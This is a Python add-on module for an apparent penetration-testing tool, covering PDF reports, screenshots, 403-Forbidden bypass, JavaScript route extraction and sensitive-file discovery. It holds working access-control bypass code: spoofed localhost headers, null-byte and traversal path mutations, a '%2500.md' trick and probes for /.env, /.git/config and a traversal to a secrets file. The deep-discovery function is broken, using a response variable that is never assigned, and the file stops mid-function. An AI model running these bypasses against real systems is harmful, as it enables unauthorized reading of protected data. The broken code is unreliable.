#!/usr/bin/env python3
"""
MCATester - osint_features.py
Add-on features for osint_agent.py v5:
  1. PDF Report Generation — professional pentest-style PDF
  2. Screenshot Capture — headless browser screenshots of findings
  3. 403 Bypass — multiple techniques to bypass 403 Forbidden

Usage:
  Import into osint_agent.py or run standalone:
    python osint_features.py --test

Setup:
  pip install reportlab Pillow
  # For screenshots (optional):
  pip install selenium
  # Or use playwright:
  pip install playwright && python -m playwright install chromium
"""

import os
import re
import time
import requests
import urllib3
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlunparse, quote

urllib3.disable_warnings()


def identify_stack(url):
    try:
        # We look at headers and common file locations, not just the homepage text
        r = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        headers = str(r.headers).lower()
        
        # 1. Check for Express.js (Juice Shop's engine) in the 'X-Powered-By' header
        if "express" in headers:
            return "MODERN_JS"
        
        # 2. Check for the language cookie (io is a common socket.io/express marker)
        if "language" in r.cookies or "io" in r.cookies:
            return "MODERN_JS"

        # 3. Aggressive: Try to fetch a common JS file directly
        # If /main.js or /runtime.js exists, it's a Modern JS app
        js_check = requests.get(urljoin(url, "runtime.js"), timeout=3)
        if js_check.status_code == 200:
            return "MODERN_JS"

        return "UNKNOWN"
    except:
        return "UNKNOWN"
# FEATURE 1 — PDF REPORT GENERATION
# ═════════════════════════════════════════════

def generate_pdf_report(osint_result, target, output_path=None):
    """
    Generate a professional pentest-style PDF report.
    Args:
        osint_result: dict returned by run_osint()
        target: domain string
        output_path: optional output file path
    Returns: path to generated PDF
    """
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.units import inch, mm
    from reportlab.lib.colors import HexColor, black, white, grey
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
                                     Table, TableStyle, PageBreak, HRFlowable,
                                     KeepTogether)
    from reportlab.graphics.shapes import Drawing, Rect, String
    from reportlab.graphics.charts.piecharts import Pie

    if not output_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = f"report_{target.replace('.','_')}_{ts}.pdf"

    doc = SimpleDocTemplate(output_path, pagesize=A4,
                            topMargin=30*mm, bottomMargin=25*mm,
                            leftMargin=20*mm, rightMargin=20*mm)

    # Colors
    DARK = HexColor("#1a1a2e")
    ACCENT = HexColor("#e94560")
    BLUE = HexColor("#0f3460")
    GREEN = HexColor("#2ecc71")
    YELLOW = HexColor("#f39c12")
    ORANGE = HexColor("#e67e22")
    RED = HexColor("#e74c3c")
    LIGHT_GREY = HexColor("#f5f5f5")

    SEV_COLORS = {
        "CRITICAL": RED,
        "HIGH": ORANGE,
        "MEDIUM": YELLOW,
        "LOW": BLUE,
        "INFO": HexColor("#95a5a6"),
    }

    # Styles
    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle("CoverTitle", parent=styles["Title"],
                              fontSize=28, textColor=white, alignment=TA_CENTER,
                              spaceAfter=10))
    styles.add(ParagraphStyle("CoverSub", parent=styles["Normal"],
                              fontSize=14, textColor=HexColor("#cccccc"),
                              alignment=TA_CENTER, spaceAfter=6))
    styles.add(ParagraphStyle("SectionHead", parent=styles["Heading1"],
                              fontSize=16, textColor=DARK, spaceBefore=20,
                              spaceAfter=10, borderWidth=0,
                              borderPadding=5, borderColor=ACCENT))
    styles.add(ParagraphStyle("SubHead", parent=styles["Heading2"],
                              fontSize=12, textColor=BLUE, spaceBefore=12,
                              spaceAfter=6))
    styles.add(ParagraphStyle("Body", parent=styles["Normal"],
                              fontSize=10, leading=14, alignment=TA_JUSTIFY,
                              spaceAfter=6))
    styles.add(ParagraphStyle("CodeBlock", parent=styles["Normal"],
                              fontName="Courier", fontSize=8, leading=10,
                              backColor=LIGHT_GREY, spaceAfter=4,
                              leftIndent=10, rightIndent=10))
    styles.add(ParagraphStyle("SevLabel", parent=styles["Normal"],
                              fontSize=10, textColor=white, alignment=TA_CENTER))

    story = []
    findings = osint_result.get("findings", [])
    recon = osint_result.get("recon", {})
    now = datetime.now().strftime("%Y-%m-%d %H:%M")

    # Count severities
    sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev = f.get("severity", "INFO")
        sev_counts[sev] = sev_counts.get(sev, 0) + 1

    # ── COVER PAGE ──────────────────────────────
    # Dark background block
    cover_data = [
        [""],
        [""],
        [""],
        [Paragraph("OSINT INVESTIGATION REPORT", styles["CoverTitle"])],
        [Paragraph(f"Target: {target}", styles["CoverSub"])],
        [Paragraph(f"Date: {now}", styles["CoverSub"])],
        [Paragraph("MCATester Security Assessment", styles["CoverSub"])],
        [""],
        [Paragraph("CONFIDENTIAL", styles["CoverSub"])],
    ]
    cover_table = Table(cover_data, colWidths=[170*mm])
    cover_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), DARK),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROWHEIGHTS", (0, 0), (-1, -1), 25*mm),
        ("LEFTPADDING", (0, 0), (-1, -1), 20),
        ("RIGHTPADDING", (0, 0), (-1, -1), 20),
    ]))
    story.append(cover_table)
    story.append(PageBreak())

    # ── EXECUTIVE SUMMARY ───────────────────────
    story.append(Paragraph("1. Executive Summary", styles["SectionHead"]))
    story.append(HRFlowable(width="100%", thickness=2, color=ACCENT))
    story.append(Spacer(1, 10))

    total_findings = len(findings)
    risk_level = "CRITICAL" if sev_counts["CRITICAL"] > 0 else \
                 "HIGH" if sev_counts["HIGH"] > 0 else \
                 "MEDIUM" if sev_counts["MEDIUM"] > 0 else "LOW"

    summary_text = (
        f"This OSINT investigation of <b>{target}</b> identified "
        f"<b>{total_findings}</b> confirmed finding(s). "
        f"The overall risk level is assessed as <b>{risk_level}</b>. "
    )
    if sev_counts["CRITICAL"]:
        summary_text += f"<font color='red'><b>{sev_counts['CRITICAL']} critical</b></font> finding(s) require immediate attention. "
    if sev_counts["HIGH"]:
        summary_text += f"<b>{sev_counts['HIGH']} high</b> severity finding(s) detected. "

    story.append(Paragraph(summary_text, styles["Body"]))
    story.append(Spacer(1, 10))

    # Severity summary table
    sev_data = [
        [Paragraph("<b>Severity</b>", styles["Body"]),
         Paragraph("<b>Count</b>", styles["Body"])],
    ]
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        count = sev_counts[sev]
        color = SEV_COLORS[sev]
        sev_data.append([
            Paragraph(f'<font color="white"><b>{sev}</b></font>', styles["SevLabel"]),
            Paragraph(f"<b>{count}</b>", styles["Body"]),
        ])
    sev_table = Table(sev_data, colWidths=[50*mm, 30*mm])
    sev_table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), DARK),
        ("TEXTCOLOR", (0, 0), (-1, 0), white),
        ("BACKGROUND", (0, 1), (0, 1), RED),
        ("BACKGROUND", (0, 2), (0, 2), ORANGE),
        ("BACKGROUND", (0, 3), (0, 3), YELLOW),
        ("BACKGROUND", (0, 4), (0, 4), BLUE),
        ("GRID", (0, 0), (-1, -1), 0.5, grey),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ALIGN", (1, 0), (1, -1), "CENTER"),
        ("ROWHEIGHTS", (0, 0), (-1, -1), 8*mm),
    ]))
    story.append(sev_table)
    story.append(Spacer(1, 15))

    # ── FINDINGS ────────────────────────────────
    story.append(Paragraph("2. Confirmed Vulnerabilities", styles["SectionHead"]))
    story.append(HRFlowable(width="100%", thickness=2, color=ACCENT))
    story.append(Spacer(1, 10))

    if not findings:
        story.append(Paragraph("No confirmed vulnerabilities were identified during this assessment.",
                               styles["Body"]))
    else:
        for i, f in enumerate(findings, 1):
            sev = f.get("severity", "INFO")
            color = SEV_COLORS.get(sev, grey)

            # Finding header
            header_data = [[
                Paragraph(f'<font color="white"><b>[{sev}]</b></font>', styles["SevLabel"]),
                Paragraph(f'<b>Finding {i}: {f.get("vuln_type", "Unknown")}</b>', styles["Body"]),
            ]]
            header_table = Table(header_data, colWidths=[25*mm, 145*mm])
            header_table.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (0, 0), color),
                ("BACKGROUND", (1, 0), (1, 0), LIGHT_GREY),
                ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
                ("LEFTPADDING", (0, 0), (-1, -1), 5),
                ("ROWHEIGHTS", (0, 0), (-1, -1), 8*mm),
            ]))
            story.append(header_table)

            # Details
            url = f.get("url", "N/A")
            status = f.get("status", "N/A")
            story.append(Paragraph(f"<b>URL:</b> {url[:120]}", styles["CodeBlock"]))
            story.append(Paragraph(f"<b>HTTP Status:</b> {status}", styles["Body"]))
            story.append(Paragraph(f"<b>Category:</b> {f.get('category', 'N/A')}", styles["Body"]))

            # Evidence
            evidence = f.get("evidence", {})
            if evidence:
                story.append(Paragraph("<b>Evidence:</b>", styles["Body"]))
                for k, vals in list(evidence.items())[:5]:
                    for v in (vals[:2] if isinstance(vals, (list,tuple)) else [str(vals)]):
                        v_safe = str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                        story.append(Paragraph(
                            f"  {k.upper()}: {v_safe[:100]}", styles["CodeBlock"]))

            # Summary
            summary = f.get("summary", "")
            if summary:
                story.append(Paragraph(f"<b>Summary:</b> {summary[:200]}", styles["Body"]))

            story.append(Spacer(1, 10))

    # ── INFRASTRUCTURE ──────────────────────────
    story.append(PageBreak())
    story.append(Paragraph("3. Infrastructure Summary", styles["SectionHead"]))
    story.append(HRFlowable(width="100%", thickness=2, color=ACCENT))
    story.append(Spacer(1, 10))

    dns = recon.get("dns", "N/A")
    story.append(Paragraph("<b>DNS Records:</b>", styles["SubHead"]))
    for line in dns.split("\n")[:10]:
        if line.strip():
            story.append(Paragraph(line.strip()[:120], styles["CodeBlock"]))

    story.append(Spacer(1, 8))
    story.append(Paragraph("<b>Open Ports:</b>", styles["SubHead"]))
    ports = recon.get("open_ports", [])
    story.append(Paragraph(str(ports) if ports else "None detected", styles["Body"]))

    story.append(Spacer(1, 8))
    story.append(Paragraph("<b>Technologies:</b>", styles["SubHead"]))
    techs = recon.get("technologies", [])
    story.append(Paragraph(", ".join(techs) if techs else "None detected", styles["Body"]))

    story.append(Spacer(1, 8))
    subs = recon.get("subdomains", []) or osint_result.get("subdomains", [])
    story.append(Paragraph("<b>Subdomains:</b>", styles["SubHead"]))
    if subs:
        for s in subs[:20]:
            story.append(Paragraph(f"  {s}", styles["CodeBlock"]))
    else:
        story.append(Paragraph("None found", styles["Body"]))

    # ── TECH STACK ──────────────────────────────
    story.append(Spacer(1, 8))
    story.append(Paragraph("<b>Tech Stack Details:</b>", styles["SubHead"]))
    tech_raw = recon.get("tech_raw", "")
    for line in tech_raw.split("\n")[:15]:
        if line.strip():
            line_safe = line.strip()[:120].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            story.append(Paragraph(line_safe, styles["CodeBlock"]))

    # ── WHOIS ───────────────────────────────────
    story.append(Spacer(1, 8))
    story.append(Paragraph("<b>WHOIS:</b>", styles["SubHead"]))
    whois = recon.get("whois", "")
    for line in whois.split("\n")[:10]:
        if line.strip():
            line_safe = line.strip()[:120].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            story.append(Paragraph(line_safe, styles["CodeBlock"]))

    # ── GITHUB ──────────────────────────────────
    story.append(Spacer(1, 8))
    story.append(Paragraph("<b>GitHub Reconnaissance:</b>", styles["SubHead"]))
    github = recon.get("github", "")
    for line in github.split("\n")[:10]:
        if line.strip():
            line_safe = line.strip()[:100].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            story.append(Paragraph(line_safe, styles["CodeBlock"]))

    # ── UNVERIFIED ──────────────────────────────
    unreachable = osint_result.get("unreachable", [])
    if unreachable:
        story.append(PageBreak())
        story.append(Paragraph("4. Unverified Findings", styles["SectionHead"]))
        story.append(HRFlowable(width="100%", thickness=2, color=ACCENT))
        story.append(Spacer(1, 10))
        story.append(Paragraph(
            f"{len(unreachable)} URLs were found during dorking but could not be verified "
            f"because the target was unreachable. These should be re-tested.",
            styles["Body"]))
        for u in unreachable[:15]:
            url = u.get("url", "")[:100]
            story.append(Paragraph(f"  {url}", styles["CodeBlock"]))


    # ── IDENTITY OSINT ──────────────────────────
    identity = recon.get("identity", {})
    if identity:
        story.append(Spacer(1, 15))
        story.append(Paragraph("4. Identity & Exposure OSINT", styles["SectionHead"]))
        story.append(HRFlowable(width="100%", thickness=2, color=ACCENT))
        story.append(Spacer(1, 10))

        # IP Intelligence
        for ip_data in identity.get("ip_intel", []):
            if not ip_data.get("error"):
                story.append(Paragraph(f"<b>IP {ip_data.get('ip', '')}</b>", styles["SubHead"]))
                story.append(Paragraph(
                    f"Org: {ip_data.get('org', 'N/A')} | "
                    f"Location: {ip_data.get('city', '')}, {ip_data.get('region', '')}, {ip_data.get('country', '')} | "
                    f"Hosting: {ip_data.get('hostname', 'N/A')}",
                    styles["Body"]))

        # Holehe
        for h in identity.get("holehe", []):
            if h.get("registered_count", 0) > 0:
                sites = ", ".join(h.get("registered_sites", [])[:10])
                story.append(Paragraph(
                    f"<b>Email: {h.get('email', '')}</b> — registered on "
                    f"<b>{h.get('registered_count', 0)}</b> sites: {sites}",
                    styles["Body"]))

        # Sherlock
        for s in identity.get("sherlock", []):
            if s.get("found_count", 0) > 0:
                story.append(Paragraph(
                    f"<b>Username: {s.get('username', '')}</b> — found on "
                    f"<b>{s.get('found_count', 0)}</b> platforms",
                    styles["Body"]))
                for url in s.get("profiles", [])[:5]:
                    story.append(Paragraph(f"  {url}", styles["CodeBlock"]))

        if not any([identity.get("ip_intel"), identity.get("holehe"), identity.get("sherlock")]):
            story.append(Paragraph("No identity exposure found.", styles["Body"]))

    # ── FOOTER NOTE ─────────────────────────────
    story.append(Spacer(1, 30))
    story.append(HRFlowable(width="100%", thickness=1, color=grey))
    story.append(Paragraph(
        f"<i>Report generated by MCATester OSINT Agent v5 on {now}. "
        f"This report is confidential and intended for authorized recipients only.</i>",
        ParagraphStyle("Footer", parent=styles["Normal"],
                        fontSize=8, textColor=grey, alignment=TA_CENTER)))

    # Build PDF
    doc.build(story)
    print(f"  [PDF] Report saved → {output_path}")
    return output_path


# ═════════════════════════════════════════════
# FEATURE 2 — SCREENSHOT CAPTURE
# ═════════════════════════════════════════════

def capture_screenshots(findings, output_dir="screenshots", max_screenshots=10):
    """
    Capture screenshots of finding URLs using a headless browser.
    Tries Playwright first, falls back to Selenium, falls back to requests+PIL.

    Args:
        findings: list of finding dicts with "url" key
        output_dir: directory to save screenshots
        max_screenshots: max number to capture
    Returns: list of {"url": ..., "path": ..., "success": bool}
    """
    os.makedirs(output_dir, exist_ok=True)
    results = []

    urls = []
    for f in findings[:max_screenshots]:
        url = f.get("url", "")
        if url and url not in [u["url"] for u in urls]:
            urls.append({"url": url, "severity": f.get("severity", "INFO"),
                         "vuln_type": f.get("vuln_type", "")})

    if not urls:
        print("  [Screenshot] No URLs to capture")
        return results

    print(f"  [Screenshot] Capturing {len(urls)} screenshots...")

    # Try Playwright first (best quality)
    try:
        from playwright.sync_api import sync_playwright
        print("  [Screenshot] Using Playwright")
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(viewport={"width": 1280, "height": 900},
                                     ignore_https_errors=True)
            for i, item in enumerate(urls):
                url = item["url"]
                fname = f"screenshot_{i+1}_{urlparse(url).netloc.replace('.','_')}.png"
                fpath = os.path.join(output_dir, fname)
                try:
                    page.goto(url, timeout=15000, wait_until="domcontentloaded")
                    time.sleep(1)
                    page.screenshot(path=fpath, full_page=False)
                    results.append({"url": url, "path": fpath, "success": True})
                    print(f"    ✓ {url[:60]}")
                except Exception as e:
                    results.append({"url": url, "path": None, "success": False, "error": str(e)[:60]})
                    print(f"    ✗ {url[:60]} ({str(e)[:40]})")
            browser.close()
        return results
    except ImportError:
        pass

    # Try Selenium fallback
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        print("  [Screenshot] Using Selenium")
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1280,900")
        options.add_argument("--ignore-certificate-errors")

        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(15)

        for i, item in enumerate(urls):
            url = item["url"]
            fname = f"screenshot_{i+1}_{urlparse(url).netloc.replace('.','_')}.png"
            fpath = os.path.join(output_dir, fname)
            try:
                driver.get(url)
                time.sleep(2)
                driver.save_screenshot(fpath)
                results.append({"url": url, "path": fpath, "success": True})
                print(f"    ✓ {url[:60]}")
            except Exception as e:
                results.append({"url": url, "path": None, "success": False, "error": str(e)[:60]})
                print(f"    ✗ {url[:60]} ({str(e)[:40]})")
        driver.quit()
        return results
    except ImportError:
        pass

    # Last resort: just save the HTTP response as a text file
    print("  [Screenshot] No browser available — saving response text instead")
    print("  [Screenshot] Install playwright: pip install playwright && python -m playwright install chromium")
    for i, item in enumerate(urls):
        url = item["url"]
        fname = f"response_{i+1}_{urlparse(url).netloc.replace('.','_')}.txt"
        fpath = os.path.join(output_dir, fname)
        try:
            r = requests.get(url, timeout=10, verify=False,
                             headers={"User-Agent": "Mozilla/5.0"})
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(f"URL: {url}\n")
                f.write(f"Status: {r.status_code}\n")
                f.write(f"Headers:\n")
                for k, v in r.headers.items():
                    f.write(f"  {k}: {v}\n")
                f.write(f"\nBody:\n{r.text[:5000]}")
            results.append({"url": url, "path": fpath, "success": True})
            print(f"    ✓ {url[:60]} (text saved)")
        except Exception as e:
            results.append({"url": url, "path": None, "success": False})
            print(f"    ✗ {url[:60]}")

    return results


# ═════════════════════════════════════════════
# FEATURE 3 — 403 BYPASS
# ═════════════════════════════════════════════

# Bypass techniques ordered by likelihood of success
BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Host": "localhost"},
]

BYPASS_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

def generate_path_mutations(path):
    """Generate URL path mutations to try bypassing path-based 403."""
    mutations = []
    if not path or path == "/":
        return ["/"]

    clean = path.rstrip("/")

    mutations = [
        path,
        f"{clean}/",              # trailing slash
        f"{clean}/.",             # dot after slash
        f"{clean}//",            # double slash
        f"{clean}/..",           # parent traversal
        f"{clean}%20",           # URL-encoded space
        f"{clean}%09",           # tab
        f"{clean}%00",           # null byte
        f"{clean}..;/",          # Tomcat bypass
        f"{clean};/",            # semicolon (Jetty, Tomcat)
        f"/{clean.lstrip('/')}", # ensure leading slash
        f"//{clean.lstrip('/')}", # double leading slash
        f"/.;{clean}",           # dot-semicolon prefix
        f"{clean}?",             # empty query string
        f"{clean}#",             # fragment
        f"{clean}/.randomfile",  # random child
        clean.upper(),           # case change
        clean.replace("/", "//"), # double slashes throughout
    ]

    # URL-encoded versions
    encoded = quote(clean, safe="")
    mutations.append(f"/{encoded}")

    # Double URL-encode
    double_encoded = quote(encoded, safe="")
    mutations.append(f"/{double_encoded}")

    # Remove duplicates while preserving order
    seen = set()
    unique = []
    for m in mutations:
        if m not in seen:
            seen.add(m)
            unique.append(m)

    return unique


def try_403_bypass(url, timeout=6):
    """
    Try multiple techniques to bypass a 403 Forbidden response.

    Args:
        url: the URL that returned 403
        timeout: request timeout

    Returns: dict with results:
        {
            "original_url": str,
            "bypassed": bool,
            "successful_technique": str or None,
            "status": int,
            "content_preview": str,
            "all_attempts": list of attempt dicts
        }
    """
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }

    attempts = []
    bypassed = False
    best_result = None

    # ── TECHNIQUE 1: Header manipulation ────────
    for bypass_header in BYPASS_HEADERS:
        headers = {**base_headers, **bypass_header}
        header_name = list(bypass_header.keys())[0]
        try:
            r = requests.get(url, headers=headers, timeout=timeout,
                             verify=False, allow_redirects=True)
            attempt = {
                "technique": f"Header: {header_name}: {bypass_header[header_name]}",
                "status": r.status_code,
                "length": len(r.content),
            }
            attempts.append(attempt)

            if r.status_code == 200 and len(r.content) > 100:
                bypassed = True
                best_result = {
                    "technique": attempt["technique"],
                    "status": r.status_code,
                    "content_preview": r.text[:500],
                    "content_length": len(r.content),
                }
                break
        except:
            pass

    # ── TECHNIQUE 2: Path mutations ─────────────
    if not bypassed:
        path_mutations = generate_path_mutations(path)
        for mutation in path_mutations:
            try_url = base + mutation
            if try_url == url:
                continue
            try:
                r = requests.get(try_url, headers=base_headers, timeout=timeout,
                                 verify=False, allow_redirects=True)
                attempt = {
                    "technique": f"Path mutation: {mutation}",
                    "status": r.status_code,
                    "length": len(r.content),
                }
                attempts.append(attempt)

                if r.status_code == 200 and len(r.content) > 100:
                    bypassed = True
                    best_result = {
                        "technique": attempt["technique"],
                        "status": r.status_code,
                        "content_preview": r.text[:500],
                        "content_length": len(r.content),
                        "url": try_url,
                    }
                    break
            except:
                pass

    # ── TECHNIQUE 3: HTTP method switching ──────
    if not bypassed:
        for method in ["POST", "PUT", "PATCH", "OPTIONS"]:
            try:
                r = requests.request(method, url, headers=base_headers,
                                     timeout=timeout, verify=False, allow_redirects=True)
                attempt = {
                    "technique": f"Method: {method}",
                    "status": r.status_code,
                    "length": len(r.content),
                }
                attempts.append(attempt)

                if r.status_code == 200 and len(r.content) > 100:
                    bypassed = True
                    best_result = {
                        "technique": attempt["technique"],
                        "status": r.status_code,
                        "content_preview": r.text[:500],
                        "content_length": len(r.content),
                    }
                    break
            except:
                pass

    # ── TECHNIQUE 4: Protocol downgrade ─────────
    if not bypassed:
        if parsed.scheme == "https":
            http_url = urlunparse(parsed._replace(scheme="http"))
            try:
                r = requests.get(http_url, headers=base_headers, timeout=timeout,
                                 verify=False, allow_redirects=False)
                attempt = {
                    "technique": "Protocol downgrade (HTTPS → HTTP)",
                    "status": r.status_code,
                    "length": len(r.content),
                }
                attempts.append(attempt)

                if r.status_code == 200 and len(r.content) > 100:
                    bypassed = True
                    best_result = {
                        "technique": attempt["technique"],
                        "status": r.status_code,
                        "content_preview": r.text[:500],
                        "content_length": len(r.content),
                    }
            except:
                pass

    return {
        "original_url": url,
        "bypassed": bypassed,
        "successful_technique": best_result.get("technique") if best_result else None,
        "status": best_result.get("status") if best_result else 403,
        "content_preview": best_result.get("content_preview", "") if best_result else "",
        "bypass_url": best_result.get("url", url) if best_result else url,
        "total_attempts": len(attempts),
        "all_attempts": attempts,
    }


def run_403_bypass_stage(findings, domain=None):
    """
    Run 403 bypass on all findings that got a 403 response.
    Integrates into the OSINT pipeline.

    Args:
        findings: list of finding dicts
        domain: target domain for context

    Returns: list of new findings from successful bypasses
    """
    # Find all 403 URLs
    blocked_urls = set()
    for f in findings:
        if f.get("status") == 403:
            blocked_urls.add(f.get("url", ""))

    if not blocked_urls:
        print("  No 403 responses to bypass")
        return []

    print(f"  Testing {len(blocked_urls)} blocked URLs...\n")
    new_findings = []

    for url in blocked_urls:
        print(f"  [403] {url[:65]}")
        result = try_403_bypass(url)

        if result["bypassed"]:
            technique = result["successful_technique"]
            print(f"    ✓ BYPASSED with: {technique}")
            print(f"    Status: {result['status']} | Size: {len(result.get('content_preview',''))} bytes")

            # Create a new finding for the bypass
            new_findings.append({
                "url": result.get("bypass_url", url),
                "category": "403 Bypass",
                "severity": "HIGH",
                "status": result["status"],
                "evidence": {"bypass_technique": [technique]},
                "confirmed": True,
                "vuln_type": f"403 Bypass successful ({technique})",
                "summary": f"Access control bypassed using {technique}",
                "excerpt": result.get("content_preview", "")[:200],
                "source": "on_target",
                "bypass_details": result,
            })
        else:
            print(f"    ✗ No bypass found ({result['total_attempts']} techniques tried)")

    print(f"\n  403 bypass results: {len(new_findings)} successful / {len(blocked_urls)} tested")
    return new_findings



# ═════════════════════════════════════════════
# FEATURE 4 — JAVASCRIPT ROUTE EXTRACTION
# ═════════════════════════════════════════════
def extract_js_endpoints(target_url):
    import re
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin

    print(f"  [JS Scan] Analyzing: {target_url}")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    
    found_endpoints = set()
    
    try:
        r = session.get(target_url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # 1. Find scripts in HTML
        scripts = [urljoin(target_url, s.get('src')) for s in soup.find_all('script') if s.get('src')]
        
        # 2. FALLBACK: If 0 scripts found, manually guess common bundle paths
        if not scripts:
            print("  [!] No scripts found in HTML. Trying common bundle paths...")
            common_bundles = ['main.js', 'runtime.js', 'vendor.js', 'polyfills.js']
            scripts = [urljoin(target_url, b) for b in common_bundles]

        # 3. Enhanced Regex: Look for more path patterns
        path_regex = r'["\'](?:\.?\.?\/)([\w\-\?=&/]{3,})["\']'

        for js_url in scripts:
            try:
                print(f"    [+] Fetching JS: {js_url}")
                js_res = session.get(js_url, timeout=10, verify=False)
                if js_res.status_code != 200:
                    continue
                
                matches = re.findall(path_regex, js_res.text)
                for match in matches:
                    route = f"/{match.lstrip('/')}"
                    if not route.endswith(('.js', '.css', '.png', '.jpg', '.svg')):
                        found_endpoints.add(route)
            except:
                continue
                
        return list(found_endpoints)
    except Exception as e:
        print(f"  [!] JS Scan Error: {e}")
        return []



def run_deep_discovery(target_url):
    from urllib.parse import urlparse, urljoin
    base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
    
    # 1. Diagnose the site ONCE
    tech_stack = identify_stack(base_url)
    
    # 2. Apply fallback ONLY if the diagnosis fails
    if tech_stack == "UNKNOWN":
        print(" [!] Tech unknown, falling back to MODERN_JS scan...")
        tech_stack = "MODERN_JS" 
    
    print(f"  [*] Technology Detected: {tech_stack}")
    
 

    # 2. Set the wordlist (Added the REAL Juice Shop paths here)
    tech_specific_paths = {
        "MODERN_JS": [
            "/ftp/acquisitions.md",
            "/ftp/package.json.bak",
            "/ftp/coupons_backup.sql",
            "/ftp/../app/private/secrets.txt"
        ],
        "LEGACY_ASP": ["/web.config", "/trace.axd", "/admin/login.aspx"]
    }
    
    paths_to_test = ["/.env", "/.git/config"] + tech_specific_paths.get(tech_stack, [])
    results = []
    
    
    # 3. The Scan Loop
    for path in paths_to_test:
        full_url = urljoin(base_url, path)
        

        time.sleep(5)

        try: 

            
            
            # --- ADD THIS: The 503 Handler ---
            if r.status_code == 503:
                print(f"    [-] Server busy at {path}. Retrying in 10s...")
                time.sleep(10) # Wait longer for the container to wake up
                r = requests.get(full_url, timeout=15, verify=False)
                
                if r.status_code == 503:
                    print(f"    [!] Skipping {path}: Server consistently overloaded.")
                    continue

            
            content_type = r.headers.get('Content-Type', '').lower()

            # --- THE ANTI-DECOY FILTER ---
            if r.status_code == 200 and "text/html" in content_type:
                if any(ext in path for ext in [".env", ".sql", ".git", ".bak", ".md"]):
                     continue 

            # --- THE NULL BYTE BYPASS (NEW) ---
            elif r.status_code == 403:
                # If blocked, attempt the Poison Null Byte bypass
                bypass_url = f"{full_url}%2500.md"
                r_bypass = requests.get(bypass_url, timeout=5, verify=False)
                
                if r_bypass.status_code == 200:
                    print(f"    [!] BYPASS SUCCESSFUL: {path} accessed via Null Byte trick.")
                    results.append({
                        "url": bypass_url,
                        "category": "Broken Access Control (Null Byte Bypass)",
                        "severity": "CRITICAL",
                        "status": 200
                    })
                    continue

            # --- VALID FINDINGS ---
            if r.status_code == 200:
                print(f"    [+] VALID FILE FOUND: {path}")
                is_critical = any(ext in path for ext in [".env", ".sql", ".git", ".bak"])
                results.append({
                    "url": full_url, 
                    "category": "Sensitive File Exposure", 
                    "severity": "CRITICAL" if is_critical else "MEDIUM",
                    "status": 200
                })
        except:
            continue


    return results
# ═════════════════════════════════════════════
# INTEGRATION HELPERS
# ═════════════════════════════════════════════

def integrate_features(osint_result, target, enable_pdf=True, enable_screenshots=True,
                       enable_403_bypass=True):
    """
    Run all enabled features on OSINT results.
    Call this after run_osint() completes.

    Usage:
        result = run_osint("demo.testfire.net")
        integrate_features(result, "demo.testfire.net")
    """
    findings = osint_result.get("findings", [])

    # ── 403 BYPASS ──────────────────────────────
    if enable_403_bypass:
        print(f"\n{'─'*55}")
        print(f"  6  403 Bypass Testing")
        print(f"{'─'*55}")

        # Collect 403 URLs from all stages
        all_403 = []
        for f in findings:
            if f.get("status") == 403:
                all_403.append(f)

        # Also check unreachable findings that might have been 403
        for u in osint_result.get("unreachable", []):
            if u.get("status") == 403:
                all_403.append(u)

        if all_403:
            bypass_findings = run_403_bypass_stage(all_403)
            if bypass_findings:
                findings.extend(bypass_findings)
                osint_result["findings"] = findings
                print(f"  Added {len(bypass_findings)} bypass findings")
        else:
            print("  No 403 responses found to test")

    # ── SCREENSHOTS ─────────────────────────────
    if enable_screenshots and findings:
